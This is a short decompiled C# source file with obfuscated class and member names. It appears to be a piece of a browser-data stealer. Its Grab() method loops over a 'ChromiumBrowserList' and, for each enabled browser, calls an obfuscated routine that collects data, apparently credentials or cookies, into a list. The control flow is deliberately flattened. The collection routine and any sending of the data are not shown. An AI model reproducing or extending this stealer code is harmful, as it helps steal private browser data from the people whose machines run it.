using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using TMiOl;
using p3N5Y;

namespace ZAZUx;

public class swK : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string OLmccn21A5i
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public swK()
	{
		OLmccn21A5i = "";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		List<fAUNhG4wfK.VA9>.Enumerator enumerator = default;
		do
		{
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 2)
			{
				enumerator = fAUNhG4wfK.ChromiumBrowserList.GetEnumerator();
				num = 3;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 3);
		try
		{
			while (enumerator.MoveNext())
			{
				fAUNhG4wfK.VA9 current = enumerator.Current;
				if (current.f1yuVL)
				{
					list.AddRange(TMiOl._0OgNv.tL4OBK(current.UGX78vp8rG6, current.Xj2aIKPsZBi));
				}
			}
			return list;
		}
		finally
		{
			((IDisposable)enumerator/*cast due to constrained. prefix*/).Dispose();
		}
	}
}
